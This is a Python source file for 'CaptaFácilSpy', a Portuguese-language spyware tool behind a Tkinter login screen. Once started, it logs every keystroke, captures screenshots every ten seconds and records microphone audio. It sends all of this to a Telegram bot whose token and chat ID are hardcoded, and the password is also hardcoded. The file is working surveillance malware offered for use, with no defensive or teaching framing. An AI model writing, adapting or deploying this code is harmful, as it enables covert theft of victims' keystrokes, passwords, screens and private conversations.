import tkinter as tk
from tkinter import messagebox
import threading
import time
import os
import pyautogui
import sounddevice as sd
import soundfile as sf
from pynput import keyboard
import requests
from datetime import datetime
from PIL import ImageTk, Image
import sys

BOT_TOKEN = '8169475379:AAEM3RqcruOrbFd0dBKUMzwDZ5gRPl-FqxU'
CHAT_ID = '5672315001'

USERNAME = "admin"
PASSWORD = "SpyWatdon3609"

LOG_DIR = "data/logs"
SCREENSHOT_DIR = "data/screenshots"
AUDIO_DIR = "data/audio"
KEYLOG_PATH = os.path.join(LOG_DIR, "keylog.txt")

os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
os.makedirs(AUDIO_DIR, exist_ok=True)

running = False

def send_to_telegram(file_path, caption="📎 Arquivo"):
    try:
        with open(file_path, "rb") as f:
            files = {"document": f}
            data = {"chat_id": CHAT_ID, "caption": caption}
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            requests.post(url, files=files, data=data)
    except Exception as e:
        print("Erro ao enviar:", e)

def keylogger():
    def on_press(key):
        with open(KEYLOG_PATH, "a", encoding="utf-8") as f:
            try:
                f.write(f"[{datetime.now()}] {key.char}\n")
            except:
                f.write(f"[{datetime.now()}] {key}\n")
        send_to_telegram(KEYLOG_PATH, "⌨️ Tecla capturada")
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while running:
        time.sleep(0.1)

def capture_screens():
    while running:
        filename = f"screenshot_{int(time.time())}.png"
        path = os.path.join(SCREENSHOT_DIR, filename)
        pyautogui.screenshot(path)
        send_to_telegram(path, "🖼️ Print de tela")
        time.sleep(10)

def capture_audio():
    while running:
        filename = f"audio_{int(time.time())}.wav"
        path = os.path.join(AUDIO_DIR, filename)
        fs = 44100
        duration = 5
        audio = sd.rec(int(duration * fs), samplerate=fs, channels=2)
        sd.wait()
        sf.write(path, audio, fs)
        send_to_telegram(path, "🎧 Áudio gravado")
        time.sleep(15)

class LoginScreen(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CaptaFácilSpy - Login")
        self.geometry("420x300")
        self.configure(bg="black")

        tk.Label(self, text="CAPTAFÁCILSPY", fg="lime", bg="black", font=("Arial", 18, "bold")).pack(pady=10)
        tk.Label(self, text="Nada Fica Oculto", fg="lime", bg="black", font=("Arial", 12, "italic")).pack()

        tk.Label(self, text="Login:", fg="white", bg="black").pack(pady=(20, 0))
        self.username_entry = tk.Entry(self, width=30)
        self.username_entry.pack()
        self.username_entry.insert(0, "admin")

        tk.Label(self, text="Senha:", fg="white", bg="black").pack(pady=(10, 0))
        self.password_entry = tk.Entry(self, width=30, show="*")
        self.password_entry.pack()

        tk.Button(self, text="Entrar", command=self.check_login, bg="green", fg="white").pack(pady=10)
        tk.Button(self, text="Esqueci a senha", command=self.show_hint, bg="gray", fg="white").pack()

    def check_login(self):
        if self.username_entry.get() == USERNAME and self.password_entry.get() == PASSWORD:
            self.destroy()
            app = CaptaFacilSpyApp()
            app.mainloop()
        else:
            messagebox.showerror("Erro", "Usuário ou senha incorretos!")

    def show_hint(self):
        messagebox.showinfo("Esqueci a senha", "Dica: começa com 'Spy' e termina com '3609'.")

class CaptaFacilSpyApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CaptaFácilSpy - Monitoramento")
        self.geometry("850x600")
        self.configure(bg="black")

        img_path = "dashboard login.png"
        if os.path.exists(img_path):
            img = Image.open(img_path)
            img = img.resize((800, 300), Image.LANCZOS)
            self.bg_img = ImageTk.PhotoImage(img)
            tk.Label(self, image=self.bg_img, bg="black").pack(pady=10)

        # Seção de botões centralizada
        btn_frame = tk.Frame(self, bg="black")
        btn_frame.pack(pady=10)

        tk.Button(btn_frame, text="▶ Iniciar", command=self.start_monitoring,
                  bg="green", fg="white", font=("Arial", 12), width=10).grid(row=0, column=0, padx=10)

        tk.Button(btn_frame, text="⛔ Parar", command=self.stop_monitoring,
                  bg="red", fg="white", font=("Arial", 12), width=10).grid(row=0, column=1, padx=10)

        self.clock_label = tk.Label(btn_frame, font=("Consolas", 22, "bold"), fg="lime", bg="black")
        self.clock_label.grid(row=0, column=2, padx=20)

        tk.Button(btn_frame, text="🧹 Limpar Dados", command=self.clear_data,
                  bg="blue", fg="white", font=("Arial", 12), width=15).grid(row=0, column=3, padx=10)

        tk.Button(btn_frame, text="🔁 Reiniciar", command=self.restart_app,
                  bg="gray", fg="white", font=("Arial", 12), width=12).grid(row=0, column=4, padx=10)

        self.status_label = tk.Label(self, text="🔴 Parado", fg="red", bg="black", font=("Arial", 14))
        self.status_label.pack(pady=10)

        self.update_clock()

    def update_clock(self):
        now = time.strftime("🕒 %H:%M:%S")
        self.clock_label.config(text=now)
        self.after(1000, self.update_clock)

    def start_monitoring(self):
        global running
        if not running:
            running = True
            self.status_label.config(text="🟢 Monitorando...", fg="lime")
            threading.Thread(target=keylogger, daemon=True).start()
            threading.Thread(target=capture_screens, daemon=True).start()
            threading.Thread(target=capture_audio, daemon=True).start()

    def stop_monitoring(self):
        global running
        running = False
        self.status_label.config(text="🔴 Parado", fg="red")

    def clear_data(self):
        for folder in [LOG_DIR, SCREENSHOT_DIR, AUDIO_DIR]:
            for file in os.listdir(folder):
                os.remove(os.path.join(folder, file))
        messagebox.showinfo("Limpeza", "Arquivos removidos.")

    def restart_app(self):
        self.destroy()
        os.execl(sys.executable, sys.executable, *sys.argv)

if __name__ == "__main__":
    LoginScreen().mainloop()
